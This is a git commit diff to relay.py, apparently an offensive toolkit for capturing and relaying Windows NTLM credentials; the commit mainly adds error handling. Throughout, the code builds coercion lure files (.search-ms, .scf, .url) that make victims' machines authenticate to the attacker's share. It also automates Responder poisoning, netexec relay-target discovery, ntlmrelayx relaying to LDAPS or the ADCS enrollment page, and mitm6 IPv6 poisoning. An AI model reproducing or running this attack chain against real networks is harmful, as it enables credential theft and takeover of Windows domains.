025d7976d79377cbdb8c729360c963b8b2e0c35e
nullenc0de <pseekamp@gmail.com>
2024-12-13 17:57:17 -0500

    Update relay.py

--- relay.py
+++ relay.py
@@ -17,31 +17,33 @@ logger = logging.getLogger(__name__)
 class CoerceTemplates:
     """Templates for authentication coercion"""
     
+    # WebDAV search connector template 
     SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
 <description>Microsoft Outlook</description>
 <isSearchOnlyItem>false</isSearchOnlyItem>
 <includeInStartMenuScope>true</includeInStartMenuScope>
 <iconReference>imageres.dll,-1002</iconReference>
-<templateInfo>
-<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-</templateInfo>
+<folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
 <simpleLocation>
 <url>\\\\{server}\\share\\</url>
 </simpleLocation>
 </searchConnectorDescription>"""
 
+    # SCF file template
     SCF = """[Shell]
 Command=2
 IconFile=\\\\{server}\\share\\icon.ico
 [Taskbar]
 Command=ToggleDesktop"""
 
+    # URL shortcut template 
     URL = """[InternetShortcut]
 URL=file://{server}/share/
 IconFile=\\\\{server}\\share\\icon.ico
 IconIndex=1"""
 
+    # Print notification template
     PRINT = """<?xml version="1.0" encoding="UTF-8"?>
 <descendantfonts>
 <print>
@@ -58,6 +60,7 @@ class CredentialToolkit:
         self.local_ip = self.get_local_ip(self.iface)
         self.processes = []
         self.templates = CoerceTemplates()
+        self.http_server = None
         
     def get_default_interface(self):
         """Get default network interface"""
@@ -69,107 +72,149 @@ class CredentialToolkit:
 
     def setup_coercion_files(self):
         """Generate authentication coercion files"""
-        web_dir = Path('web')
-        web_dir.mkdir(exist_ok=True)
-        
-        files = {
-            'search.search-ms': self.templates.SEARCH_MS,
-            'share.scf': self.templates.SCF,
-            'share.url': self.templates.URL,
-            'print.xml': self.templates.PRINT
-        }
-        
-        for filename, template in files.items():
-            content = template.format(server=self.local_ip)
-            (web_dir / filename).write_text(content)
+        try:
+            web_dir = Path('web')
+            web_dir.mkdir(exist_ok=True)
             
-        self.print_good(f"Generated coercion files in {web_dir}")
+            files = {
+                'search.search-ms': self.templates.SEARCH_MS,
+                'share.scf': self.templates.SCF,
+                'share.url': self.templates.URL,
+                'print.xml': self.templates.PRINT
+            }
+            
+            for filename, template in files.items():
+                try:
+                    content = template.format(server=self.local_ip)
+                    (web_dir / filename).write_text(content)
+                except Exception as e:
+                    self.print_bad(f"Error creating {filename}: {str(e)}")
+                    continue
+            
+            self.print_good(f"Generated coercion files in {web_dir}")
+            return True
+        except Exception as e:
+            self.print_bad(f"Error in setup_coercion_files: {str(e)}")
+            return False
 
     def find_relay_targets(self):
         """Find potential relay targets (SMB signing disabled)"""
-        self.print_info("Finding relay targets...")
-        cmd = f"netexec smb {self.args.target_range} --gen-relay-list targets.txt"
-        proc = self.run_command(cmd)
-        proc.wait()
-        return Path('targets.txt').exists()
+        try:
+            self.print_info("Finding relay targets...")
+            cmd = f"netexec smb {self.args.target_range} --gen-relay-list targets.txt"
+            proc = self.run_command(cmd)
+            proc.wait()
+            return Path('targets.txt').exists()
+        except Exception as e:
+            self.print_bad(f"Error finding relay targets: {str(e)}")
+            return False
 
     def edit_responder_conf(self):
         """Configure Responder settings"""
-        conf_path = Path('/usr/share/responder/Responder.conf')
-        if not conf_path.exists():
-            self.print_bad("Responder.conf not found")
-            return False
+        try:
+            conf_path = Path('/usr/share/responder/Responder.conf')
+            if not conf_path.exists():
+                self.print_bad("Responder.conf not found")
+                return False
+                
+            content = conf_path.read_text()
+            protocols = ['HTTP', 'SMB'] if self.args.relay else []
+            for proto in protocols:
+                content = content.replace(f"{proto} = On", f"{proto} = Off")
             
-        content = conf_path.read_text()
-        protocols = ['HTTP', 'SMB'] if self.args.relay else []
-        for proto in protocols:
-            content = content.replace(f"{proto} = On", f"{proto} = Off")
-        
-        conf_path.write_text(content)
-        if protocols:
-            self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
-        return True
+            conf_path.write_text(content)
+            if protocols:
+                self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
+            return True
+        except Exception as e:
+            self.print_bad(f"Error editing Responder.conf: {str(e)}")
+            return False
 
     def start_responder(self):
         """Start Responder for hash capture"""
-        cmd = f'responder -I {self.iface} -wv'
-        if self.args.analyze:
-            cmd += ' -A'
-        if self.args.challenge:
-            cmd += f' --lm --disable-ess'
-        if self.args.dhcp:
-            cmd += ' -d'
-        return self.run_command(cmd)
+        try:
+            cmd = f'responder -I {self.iface} -wv'
+            if self.args.analyze:
+                cmd += ' -A'
+            if self.args.challenge:
+                cmd += f' --lm --disable-ess'
+            if self.args.dhcp:
+                cmd += ' -d'
+            return self.run_command(cmd)
+        except Exception as e:
+            self.print_bad(f"Error starting Responder: {str(e)}")
+            return None
 
     def start_ntlmrelay(self):
         """Start ntlmrelayx with appropriate options"""
-        if not self.args.relay:
-            return None
+        try:
+            if not self.args.relay:
+                return None
+                
+            options = [
+                '-tf', 'targets.txt',
+                '-smb2support'
+            ]
+
+            if self.args.socks:
+                options.append('-socks')
             
-        options = [
-            '-tf', 'targets.txt',
-            '-smb2support'
-        ]
+            if self.args.relay_type:
+                if self.args.relay_type == 'ldaps':
+                    options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
+                elif self.args.relay_type == 'smb':
+                    options.extend(['--no-http-server', '--no-smb-server'])
+                elif self.args.relay_type == 'adcs':
+                    options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
 
-        if self.args.socks:
-            options.append('-socks')
-        
-        if self.args.relay_type:
-            if self.args.relay_type == 'ldaps':
-                options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
-            elif self.args.relay_type == 'smb':
-                options.extend(['--no-http-server', '--no-smb-server'])
-            elif self.args.relay_type == 'adcs':
-                options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
-
-        cmd = f'ntlmrelayx.py {" ".join(options)}'
-        return self.run_command(cmd)
+            cmd = f'ntlmrelayx.py {" ".join(options)}'
+            return self.run_command(cmd)
+        except Exception as e:
+            self.print_bad(f"Error starting NTLM relay: {str(e)}")
+            return None
 
     def start_mitm6(self):
         """Start mitm6 for IPv6 poisoning"""
-        if not self.args.ipv6 or not self.args.domain:
+        try:
+            if not self.args.ipv6 or not self.args.domain:
+                return None
+                
+            cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
+            return self.run_command(cmd)
+        except Exception as e:
+            self.print_bad(f"Error starting mitm6: {str(e)}")
             return None
-            
-        cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
-        return self.run_command(cmd)
 
     def start_http_server(self):
         """Start HTTP server for coercion files"""
-        os.chdir('web')
-        from http.server import HTTPServer, SimpleHTTPRequestHandler
-        server = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
-        server_thread = Thread(target=server.serve_forever)
-        server_thread.daemon = True
-        server_thread.start()
-        self.print_good(f"Started HTTP server on port {self.args.port}")
-        return server
+        try:
+            web_dir = Path('web')
+            if not web_dir.exists():
+                self.print_bad("Web directory not found")
+                return None
+
+            os.chdir(str(web_dir))
+            from http.server import HTTPServer, SimpleHTTPRequestHandler
+            server = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
+            server_thread = Thread(target=server.serve_forever)
+            server_thread.daemon = True
+            server_thread.start()
+            self.print_good(f"Started HTTP server on port {self.args.port}")
+            return server
+        except Exception as e:
+            self.print_bad(f"Error starting HTTP server: {str(e)}")
+            return None
 
     def run_command(self, cmd):
         """Execute command and return process"""
-        logger.debug(f"Running command: {cmd}")
-        proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
-        self.processes.append(proc)
-        return proc
+        try:
+            logger.debug(f"Running command: {cmd}")
+            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
+            self.processes.append(proc)
+            return proc
+        except Exception as e:
+            self.print_bad(f"Error running command '{cmd}': {str(e)}")
+            return None
 
     def auto_attack(self):
         """Run automated attack sequence"""
@@ -182,10 +227,10 @@ class CredentialToolkit:
             # Check for broadcast protocols
             self.print_info("Checking for broadcast protocols (LLMNR/NBT-NS)...")
             analyze_proc = self.run_command(f'responder -I {self.iface} -A')
-            time.sleep(10)  # Give it time to detect broadcasts
+            time.sleep(10)
             analyze_proc.terminate()
             
-            # Find potential relay targets using netexec
+            # Find potential relay targets
             self.print_info("Scanning for relay targets...")
             nxc_proc = self.run_command(f'netexec smb {self.args.target_range} --gen-relay-list targets.txt')
             nxc_proc.wait()
@@ -211,12 +256,16 @@ class CredentialToolkit:
                 return
                 
             # Setup coercion files
-            self.setup_coercion_files()
-            http_server = self.start_http_server()
+            if not self.setup_coercion_files():
+                return
+
+            # Start HTTP server
+            self.http_server = self.start_http_server()
+            if not self.http_server:
+                return
             
             # 3. Start core services
             self.print_info("Phase 3: Starting Core Services")
-            
             responder = self.start_responder()
             
             # 4. Start relay attacks if targets found
@@ -269,32 +318,39 @@ class CredentialToolkit:
                 
         except KeyboardInterrupt:
             self.print_info('\nStopping attack sequence...')
+        except Exception as e:
+            self.print_bad(f"Error in auto_attack: {str(e)}")
         finally:
             self.cleanup()
-            if http_server:
-                http_server.shutdown()
 
     def cleanup(self):
         """Cleanup processes and files"""
-        for proc in self.processes:
-            try:
-                proc.terminate()
-                proc.wait(timeout=2)
-            except:
-                proc.kill()
-
-        # Cleanup temp files
-        cleanup_files = [
-            Path('web').glob('*'),
-            Path('targets.txt')
-        ]
-        
-        for pattern in cleanup_files:
-            for f in Path().glob(str(pattern)):
+        try:
+            for proc in self.processes:
                 try:
-                    f.unlink()
+                    proc.terminate()
+                    proc.wait(timeout=2)
                 except:
-                    pass
+                    proc.kill()
+
+            if self.http_server:
+                self.http_server.shutdown()
+
+            # Cleanup temp files
+            cleanup_files = [
+                Path('web').glob('*'),
+                Path('targets.txt')
+            ]
+            
+            for pattern in cleanup_files:
+                for f in Path().glob(str(pattern)):
+                    try:
+                        f.unlink()
+                    except Exception as e:
+                        logger.debug(f"Error cleaning up {f}: {str(e)}")
+                        continue
+        except Exception as e:
+            self.print_bad(f"Error in cleanup: {str(e)}")
 
     def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
     def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
